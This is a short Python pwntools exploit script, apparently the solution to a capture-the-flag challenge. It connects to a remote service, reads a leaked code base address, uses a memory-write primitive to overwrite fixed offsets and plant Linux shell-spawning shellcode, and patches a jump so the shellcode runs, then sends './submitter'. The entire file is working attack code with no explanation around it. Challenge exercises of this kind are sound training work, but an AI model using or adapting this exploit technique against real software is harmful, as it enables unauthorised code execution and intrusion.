from pwn import *

context.arch = 'amd64'

#r = process("./challenge")
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
r = remote(HOST, int(PORT))

code_base = u64(r.recv(8))
log.info("code_base: %#x" % code_base)

def write(addr, val):
    r.send(p64(addr) + p64(val))

write(code_base+0x4338, code_base+0x2000)
write(code_base+0x4328, 0x42424242)
write(code_base+0x4330, code_base+0x1370)
write(code_base+0x45B0, 0)
write(code_base+0x45B4, 0)
write(code_base+0x45B8, 0)
r.send(p64(0))
r.send(p32(0))

sc = asm(shellcraft.linux.sh())
buf = code_base + 0x2200
#gdb.attach(r)
#input(">>")
for i in range(0, len(sc), 8):
    x = u64(sc[i:i+8])
    write(buf+i, x)
write(code_base+0x20A9, u64(b'\xe9'+p32(0x152)+b'\xcc'*3))

r.clean()
r.sendline('./submitter')

print(r.recvline())
#print(r.recvline(timeout=1))
#print(r.recvline(timeout=1))
#print(r.recvline(timeout=1))

r.close()

exit()


#r.interactive()
